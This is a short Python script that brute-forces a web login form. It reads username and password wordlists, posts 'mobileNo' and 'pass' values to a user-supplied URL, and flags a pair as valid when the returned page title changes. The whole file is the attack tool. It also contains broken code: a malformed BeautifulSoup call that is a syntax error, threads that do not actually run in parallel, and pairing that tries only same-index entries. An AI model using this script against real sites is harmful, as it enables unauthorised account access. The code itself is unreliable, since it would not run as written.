import requests
from threading import Thread
from bs4 import BeautifulSoup
print("You might want to change the post parameters in the payload variable as required in the function enter")
usernames_list=input("Enter the path to wordlist for usernames: ")
passwords_list=input("Enter the path to wordlist for passwords: ")
def usernames():
	users=[]
	unames=open(usernames_list,'r')
	for uname in unames.readlines():
			users.append(uname.strip('\n'))
	return users

def passwords():
	passwds=[]
	passwords=open(passwords_list,'r')
	for password in passwords.readlines():
			passwds.append(password.strip('\n'))
	return passwds

def main():
	start=int(input("Where to start?"))
	end=int(input("Where to end?"))
	site=input("Enter the url of the form:")
	for i in range(start,end+1):
		t=Thread(target=enter(i,site))
		t.start()

def enter(i,site):
	r= requests.post(site)
	soup=BeautifulSoup(r.content.'html.parser')
	uname=usernames()
	pwd=passwords()
	print("Trying username and password",uname[i],pwd[i])
	payload="mobileNo="+uname[i].strip()+"&pass="+pwd[i].strip()
	print(payload)
	r= requests.post(site,payload)
	a=BeautifulSoup(r.content.'html.parser')
	if(soup.title!=a.title):
		print("Valid usernames and passwords are : ",uname[i],pwd[i])	


	
if (__name__=="__main__"):
	main() 

